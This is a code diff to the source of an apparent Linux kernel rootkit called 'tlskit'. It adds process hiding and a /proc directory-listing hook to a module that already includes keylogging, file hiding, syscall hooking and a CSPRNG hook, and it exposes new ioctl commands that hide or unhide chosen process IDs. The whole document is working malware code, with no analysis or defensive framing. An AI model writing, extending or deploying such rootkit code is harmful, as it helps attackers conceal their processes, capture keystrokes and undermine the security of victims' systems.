@@ -12,8 +12,16 @@
 #include "keylogger.h"
 #include "csprng.h"
 #include "file_hiding.h"
+#include "process_hiding.h"
+#include "proc_hook.h"
 
 static int cleanup(void *_data) {
+
+    /* Disable process hiding */
+    disable_process_hiding();
+
+    /* Disable proc readdir hook */
+    disable_proc_filter();
 
     /* Disable CSPRNG hook */
     disable_csprng_hook();
@@ -44,6 +52,7 @@ static int cleanup(void *_data) {
 static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
 
     struct sockaddr_in addr;
+    int ret;
 
     switch (cmd) {
 
@@ -91,6 +100,26 @@ static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
             disable_key_logger();
             break;
 
+        case RKCTL_HIDE_PID_ADD:
+
+            /*
+             * Hide pid
+             */
+            if (0 > (ret = hide_process_add(arg))) {
+                return -EINVAL;
+            }
+            return ret;
+
+        case RKCTL_HIDE_PID_RM:
+
+            /*
+             * Unhide pid
+             */
+            if (0 > (ret = hide_process_rm(arg))) {
+                return -EINVAL;
+            }
+            return ret;
+
         default:
             return -ENOTTY;
     }
@@ -129,8 +158,16 @@ static int __init tlskit_init(void) {
         goto csprng_failed;
     }
 
+    if (0 != enable_proc_filter()) {
+        goto proc_failed;
+    }
+
+    enable_process_hiding();
+
     return 0;
 
+proc_failed:
+    disable_csprng_hook();
 csprng_failed:
     disable_file_hiding();
     disable_syscall_hooking();
